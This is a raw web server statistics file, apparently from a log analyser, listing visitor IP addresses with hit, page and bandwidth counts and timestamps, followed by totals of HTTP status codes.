5	0	0	0	2	0	0	25653128	0	0	25381088	0	66.249.79.121
5	2	2	1	0	25433498	25433490	0	25433490	25433490	0	88075	13.57.30.201
5	0	0	1	0	0	25388541	0	0	25388541	0	0	159.203.119.247
5	0	0	2	0	0	25305377	0	0	25136004	0	0	38.142.98.218
5	1	1	0	0	25609852	0	0	25609852	0	0	44034	159.89.187.104
5	1	1	0	0	25363714	0	0	25363714	0	0	44018	193.178.250.242
5	0	0	0	1	0	0	25174761	0	0	25174761	0	66.249.71.63
5	23	0	16	46	25657902	25561991	25659098	25143429	25423285	25143429	1311	66.249.71.61
5	19	0	14	40	25660273	25559363	25675059	25134697	25420299	25128351	15559	66.249.71.59
5	21	0	7	48	25642071	25560727	25661481	25152837	25425066	25130753	22911	66.249.71.57
5	2	2	1	0	25304000	25340733	0	25279948	25340733	0	88036	38.142.98.210
5	1	1	0	0	25260374	0	0	25260374	0	0	44042	159.89.34.149
5	1	1	0	0	25610420	0	0	25610420	0	0	44019	38.130.184.243
5	1	1	0	0	25434108	0	0	25434108	0	0	22631	104.236.254.178
5	1	1	0	0	25123896	0	0	25123896	0	0	18182	38.142.98.186
5	1	1	1	0	25474139	25474140	0	25474139	25474140	0	44018	140.82.52.83
5	1	1	1	0	25194790	25194790	0	25194790	25194790	0	18182	107.191.62.198
5	6	0	0	10	25684447	0	25677543	25138494	0	25459725	342	66.249.71.25
5	6	0	0	8	25680053	0	25609911	25466891	0	25455934	342	66.249.71.24
5	5	0	0	14	25688477	0	25688477	25459725	0	25138494	285	66.249.71.23
5	1	1	0	0	25408639	0	0	25408639	0	0	44018	109.236.8.6
5	1	1	0	0	25314811	0	0	25314811	0	0	44018	38.142.184.2
5	1	1	1	0	25592430	25631979	0	25592430	25631979	0	44019	209.17.96.2
5	3	3	0	0	25189345	0	0	25173709	0	0	61652	35.162.70.167
5	1	1	0	0	25179663	0	0	25179663	0	0	44042	165.227.120.150
5	1	1	0	2	25630504	0	25630504	25630504	0	25630504	44019	5.2.194.89
5	2	2	1	0	25358202	25326141	0	25325004	25326141	0	88036	38.142.99.2
5	1	1	0	0	25084808	0	0	25084808	0	0	43665	138.197.126.17
5	1	1	0	0	25388582	0	0	25388582	0	0	44039	159.203.168.245
5	0	0	0	1	0	0	25189920	0	0	25189920	0	212.83.165.81
5	0	0	1	0	0	25490453	0	0	25490453	0	0	13.56.250.235
5	0	0	11	0	0	25479451	0	0	25434192	0	0	54.215.254.26
5	6	0	0	9	25313710	0	25303644	25120810	0	25111004	342	66.249.77.8
5	4	0	0	9	25297925	0	25322777	25111004	0	25111004	228	66.249.77.6
5	2	0	0	11	25295805	0	25313710	25290247	0	25248668	114	66.249.77.4
5	0	0	0	1	0	0	25652803	0	0	25652803	0	159.203.165.94
5	4	0	44	0	25572077	25686963	0	25554900	25496201	0	29180	13.57.233.99
5	1	1	0	0	25260346	0	0	25260346	0	0	44042	104.131.102.171
5	1	1	0	0	25393928	0	0	25393928	0	0	44018	185.35.63.94
5	1	0	1	0	25564782	25564782	0	25564782	25564782	0	7295	80.84.57.98
5	1	1	0	0	25504671	0	0	25504671	0	0	44042	185.35.63.84
5	1	1	0	0	25486101	0	0	25486101	0	0	44033	185.35.63.79
5	1	1	0	0	25257801	0	0	25257801	0	0	44042	38.130.184.110
5	1	1	0	0	25652768	0	0	25652768	0	0	44019	45.55.55.89
5	1	1	0	0	25393865	0	0	25393865	0	0	44018	185.35.63.74
5	1	1	0	0	25657640	0	0	25657640	0	0	44019	123.30.175.199
5	1	1	0	0	25659297	0	0	25659297	0	0	44019	123.30.175.205
5	1	1	0	0	25504679	0	0	25504679	0	0	44042	185.35.63.64
5	1	1	0	0	25394621	0	0	25394621	0	0	44033	185.35.63.61
5	0	0	1	0	0	25477587	0	0	25477587	0	0	185.35.63.57
5	1	1	0	0	25393721	0	0	25393721	0	0	44018	185.35.63.55
5	1	0	1	0	25484526	25504868	0	25484526	25504868	0	57	207.241.227.104
5	0	0	1	3	0	25432357	25478892	0	25432357	25475317	0	66.249.75.71
5	3	0	0	5	25481035	0	25582381	25474120	0	25399791	171	66.249.75.69
5	1	1	0	0	25345347	0	0	25345347	0	0	44039	159.89.189.12
5	2	0	0	3	25582381	0	25481303	25478892	0	25474120	114	66.249.75.67
5	1	1	0	0	25391389	0	0	25391389	0	0	44018	185.35.63.48
5	1	1	0	0	25474462	0	0	25474462	0	0	44042	104.236.221.22
5	1	1	0	0	25216363	0	0	25216363	0	0	44018	45.55.154.65
5	0	0	1	0	0	25130861	0	0	25130861	0	0	104.236.192.179
5	1	1	0	0	25260411	0	0	25260411	0	0	44033	159.203.108.131
5	1	1	0	0	25668487	0	0	25668487	0	0	44019	209.17.97.114
5	0	0	0	1	0	0	25568565	0	0	25568565	0	142.93.77.79
5	1	1	0	0	25393738	0	0	25393738	0	0	44039	185.35.63.36
5	0	0	1	0	0	25216363	0	0	25216363	0	0	138.197.112.6
5	1	0	1	0	25564782	25564782	0	25564782	25564782	0	7295	80.84.57.39
5	1	1	1	0	25621211	25621212	0	25621211	25621212	0	44019	80.84.57.40
5	0	0	1	0	0	25501604	0	0	25501604	0	0	185.35.63.26
5	1	1	0	0	25388586	0	0	25388586	0	0	44042	159.203.123.75
5	0	0	0	1	0	0	25354353	0	0	25354353	0	51.15.147.210
5	0	0	0	1	0	0	25609800	0	0	25609800	0	159.89.178.205
5	1	1	0	0	25130869	0	0	25130869	0	0	44072	104.236.202.154
5	1	1	0	0	25389629	0	0	25389629	0	0	44042	104.131.34.183
5	0	0	1	0	0	25395690	0	0	25395690	0	0	185.35.63.15
5	6	6	0	0	25186987	0	0	25159206	0	0	52903	52.41.211.72
5	0	0	1	0	0	25652771	0	0	25652771	0	0	45.55.55.22
5	1	1	0	0	25683086	0	0	25683086	0	0	44019	123.30.175.134
5	1	1	0	0	25474442	0	0	25474442	0	0	44018	104.236.90.148
5	2	1	0	0	25671186	0	0	25588341	0	0	44076	123.30.175.132
5	0	0	0	1	0	0	25141914	0	0	25141914	0	212.129.5.0
5	0	0	1	1	0	25563303	25689665	0	25563303	25689665	0	66.249.75.15
5	2	0	1	0	25563303	25563303	0	25563303	25563303	0	14590	66.249.75.14
5	1	1	0	2	25629953	0	25629953	25629953	0	25629953	44019	14.34.148.34
5	1	1	0	0	25522588	0	0	25522588	0	0	44034	38.130.186.238
5	0	0	2	0	0	25446336	0	0	25445144	0	0	66.249.65.219
5	1	1	0	0	25130841	0	0	25130841	0	0	44063	159.203.163.128
5	0	0	1	0	0	25445144	0	0	25445144	0	0	66.249.65.217
5	0	0	1	0	0	25474481	0	0	25474481	0	0	104.236.43.237
5	1	1	0	0	25257798	0	0	25257798	0	0	44039	23.27.152.177
5	1	1	0	0	25345341	0	0	25345341	0	0	44033	159.65.47.137
5	1	1	0	0	25345650	0	0	25345650	0	0	44033	23.27.152.170
5	3	0	0	6	25618475	0	25686076	25288620	0	25288668	171	66.249.71.135
5	1	1	0	0	25522580	0	0	25522580	0	0	44034	23.27.152.166
5	0	0	0	5	0	0	25624629	0	0	25288620	0	66.249.71.133
5	1	0	0	4	25622085	0	25687283	25622085	0	25490699	57	66.249.71.131
5	0	0	0	1	0	0	25181000	0	0	25181000	0	5.188.62.53
5	1	1	0	0	25394464	0	0	25394464	0	0	44018	207.46.13.214
5	4	0	10	0	25370249	25274905	0	25080000	25079763	0	228	207.46.13.199
5	0	0	1	0	0	25440548	0	0	25440548	0	0	66.249.64.93
5	6	0	8	0	25242265	25239302	0	25235215	25102343	0	342	207.46.13.198
5	1	0	0	1	25469257	0	25471608	25469257	0	25471608	57	66.249.64.91
5	6	0	6	0	25196653	25259760	0	25097981	25192690	0	342	207.46.13.196
5	2	0	0	4	25668759	0	25683666	25666353	0	25662666	114	66.249.71.120
5	1	0	0	2	25471607	0	25472919	25471607	0	25469257	57	66.249.64.89
5	3	3	4	0	25302543	25408639	0	25112545	25112545	0	96478	109.236.8.10
5	0	0	4	0	0	25387015	0	0	25349133	0	0	207.46.13.205
5	1	0	0	4	25686075	0	25672437	25686075	0	25663862	57	66.249.71.119
5	2	0	0	4	25672437	0	25684447	25662666	0	25666353	114	66.249.71.118
5	6	0	10	0	25359722	25359418	0	25228793	25083422	0	342	207.46.13.204
5	1	1	0	0	25300208	0	0	25300208	0	0	44042	159.203.64.51
5	8	0	8	0	25377621	25377360	0	25154385	25256032	0	456	207.46.13.203
5	4	0	2	0	25209519	25211642	0	25133453	25211642	0	228	207.46.13.192
5	0	0	1	0	0	25268774	0	0	25268774	0	0	207.46.13.191
5	1	1	0	0	25388586	0	0	25388586	0	0	44033	104.236.48.32
5	2	2	1	0	25327872	25240024	0	25240280	25240024	0	88036	207.46.13.190
5	0	0	4	0	0	25305300	0	0	25304580	0	0	207.46.13.200
5	0	0	0	2	0	0	25077729	0	0	25077729	0	45.63.101.57
5	9	9	5	0	25233076	25232824	0	25146653	25211642	0	360960	207.46.13.186
5	1	1	1	0	25080000	25079768	0	25080000	25079768	0	43644	207.46.13.185
5	7	7	5	0	25280269	25280710	0	25257120	25256828	0	308126	207.46.13.184
5	1	1	0	0	25392853	0	0	25392853	0	0	44018	207.46.13.183
5	1	1	0	0	25106513	0	0	25106513	0	0	43644	207.46.13.181
5	1	1	0	0	25227259	0	0	25227259	0	0	44018	207.46.13.178
z	0	147	142	25687293	0
z	2	393	0	25688477	22401
z	4	127	86	25572077	1057566
z	5	568	568	25690465	24735531
c	200	1235	25690465
c	301	1027	25688733
c	302	52	25572077
c	401	53	25687145
c	403	5	25339016
c	404	507	25689665
c	499	23	25586032
